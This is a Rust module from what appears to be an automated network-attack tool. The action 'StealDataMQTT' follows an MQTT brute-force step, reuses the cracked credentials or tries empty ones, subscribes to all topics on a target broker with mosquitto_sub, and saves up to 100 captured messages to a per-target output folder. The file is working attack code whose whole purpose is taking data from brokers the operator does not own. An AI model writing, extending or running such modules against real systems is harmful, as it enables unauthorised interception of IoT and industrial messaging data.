use std::sync::Arc;
use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Subscribe to MQTT topics and capture messages.
/// Parent: MQTTBruteforce.
pub struct StealDataMqtt;

impl Action for StealDataMqtt {
    fn name(&self) -> &'static str { "StealDataMQTT" }
    fn port(&self) -> Option<u16> { Some(1883) }
    fn parent(&self) -> Option<&'static str> { Some("MQTTBruteforce") }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "mqtt").await;

    // MQTT may be open — try with empty creds too
    let mut all_creds = creds;
    if all_creds.is_empty() {
        all_creds.push((String::new(), String::new()));
    }

    let local_dir = build_output_dir(state, "mqtt", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    for (user, password) in &all_creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        // Use mosquitto_sub to capture messages for 30 seconds
        let result = timeout(Duration::from_secs(45), async {
            capture_mqtt(&target.ip, user, password, &local_dir).await
        })
        .await;

        match result {
            Ok(Ok(count)) if count > 0 => {
                tracing::info!(ip = %target.ip, messages = count, "MQTT messages captured");
                return ActionOutcome::Success;
            }
            _ => {}
        }
    }

    ActionOutcome::Failed("no MQTT data captured".to_string())
}

async fn capture_mqtt(
    ip: &str,
    user: &str,
    password: &str,
    local_dir: &std::path::Path,
) -> Result<usize, String> {
    let mut args = vec![
        "-h".to_string(), ip.to_string(),
        "-t".to_string(), "#".to_string(),  // Subscribe to all topics
        "-v".to_string(),                    // Verbose (print topic name)
        "-C".to_string(), "100".to_string(), // Capture 100 messages then exit
        "-W".to_string(), "30".to_string(),  // Wait max 30 seconds
    ];

    if !user.is_empty() {
        args.extend(["-u".to_string(), user.to_string()]);
        if !password.is_empty() {
            args.extend(["-P".to_string(), password.to_string()]);
        }
    }

    let output = tokio::process::Command::new("mosquitto_sub")
        .args(&args)
        .output()
        .await
        .map_err(|e| e.to_string())?;

    let content = String::from_utf8_lossy(&output.stdout);
    let lines: Vec<&str> = content.lines().filter(|l| !l.is_empty()).collect();

    if !lines.is_empty() {
        let file_path = local_dir.join("mqtt_capture.txt");
        let _ = tokio::fs::write(&file_path, content.as_bytes()).await;
    }

    Ok(lines.len())
}
